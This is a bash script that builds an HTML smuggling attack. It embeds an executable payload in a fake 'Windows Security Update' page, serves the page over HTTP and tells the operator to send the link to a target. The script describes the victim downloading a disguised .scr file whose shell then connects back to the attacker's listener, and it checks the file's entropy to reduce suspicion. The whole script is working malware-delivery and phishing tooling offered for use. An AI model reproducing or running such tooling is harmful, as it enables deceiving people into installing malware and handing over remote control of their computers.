#!/bin/bash
# ─────────────────────────────────────────────────────────
# HTML Smuggling Builder
# Embeds the ERS-W payload into a fake Windows Update page
#
# Usage: bash build_smuggle.sh [serve_port]
# ─────────────────────────────────────────────────────────

set -e

DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

R='\033[0;31m'  G='\033[0;32m'  Y='\033[0;33m'
C='\033[0;36m'  W='\033[1;37m'  N='\033[0m'

PAYLOAD="$DIR/ers-w.exe"
TEMPLATE="$DIR/smuggle_template.html"
OUTPUT="$DIR/smuggle.html"
SERVE_PORT="${1:-80}"

echo -e "${C}══════════════════════════════════════════${N}"
echo -e "${W}  HTML Smuggling Builder${N}"
echo -e "${C}══════════════════════════════════════════${N}"
echo ""

# Check payload exists
if [ ! -f "$PAYLOAD" ]; then
    echo -e "${R}[!]${N} Payload not found: $PAYLOAD"
    echo -e "${Y}[*]${N} Build it first: bash build.sh"
    exit 1
fi

if [ ! -f "$TEMPLATE" ]; then
    echo -e "${R}[!]${N} Template not found: $TEMPLATE"
    exit 1
fi

PAYLOAD_SIZE=$(du -h "$PAYLOAD" | cut -f1)
echo -e "${Y}[*]${N} Payload: $PAYLOAD ($PAYLOAD_SIZE)"

# Base64 encode payload
echo -e "${Y}[*]${N} Base64 encoding payload..."
B64=$(base64 -w0 "$PAYLOAD")
B64_LEN=${#B64}
echo -e "${G}[+]${N} Base64 size: $((B64_LEN / 1024))KB"

# Inject into template
echo -e "${Y}[*]${N} Injecting payload into HTML template..."

# Use python for reliable large string replacement
python3 -c "
import sys
template = open('$TEMPLATE', 'r').read()
b64 = open('/dev/stdin', 'r').read().strip()
result = template.replace('%%PAYLOAD_B64%%', b64)
open('$OUTPUT', 'w').write(result)
print(f'[+] Written: $OUTPUT ({len(result)} bytes)')
" <<< "$B64"

HTML_SIZE=$(du -h "$OUTPUT" | cut -f1)
echo -e "${G}[+]${N} HTML file ready: $OUTPUT ($HTML_SIZE)"

# Calculate entropy of the HTML file
ENTROPY=$(python3 -c "
import math
data = open('$OUTPUT','rb').read()
freq = {}
for b in data:
    freq[b] = freq.get(b, 0) + 1
entropy = -sum((c/len(data)) * math.log2(c/len(data)) for c in freq.values())
print(f'{entropy:.2f}')
")
echo -e "${G}[+]${N} HTML entropy: ${ENTROPY} bits/byte (base64 text = low suspicion)"

# Detect IP
KALI_IP=$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
if [ -z "$KALI_IP" ]; then
    KALI_IP=$(hostname -I | awk '{print $1}')
fi

echo ""
echo -e "${C}══════════════════════════════════════════════════${N}"
echo -e "${W}  READY${N}"
echo -e "${C}══════════════════════════════════════════════════${N}"
echo ""
echo -e "  ${W}Send this link to the target:${N}"
echo -e "  ${G}http://${KALI_IP}:${SERVE_PORT}/smuggle.html${N}"
echo ""
echo -e "  ${W}What victim sees:${N}"
echo -e "    1. 'Windows Security Update' page with progress bar"
echo -e "    2. .scr file auto-downloads (SecurityUpdate-KB5034441.scr)"
echo -e "    3. Page says 'open the downloaded file to complete'"
echo -e "    4. Victim opens → shell connects to your listener"
echo ""
echo -e "  ${W}Start listener in another terminal:${N}"
echo -e "  ${Y}cd $DIR && python3 listener.py 4443${N}"
echo ""
echo -e "${C}──────────────────────────────────────────────────${N}"
echo -e "  ${W}Starting HTTP server on port ${SERVE_PORT}...${N}"
echo -e "  ${Y}Press Ctrl+C to stop${N}"
echo ""

cd "$DIR"
python3 -m http.server "$SERVE_PORT" --bind 0.0.0.0
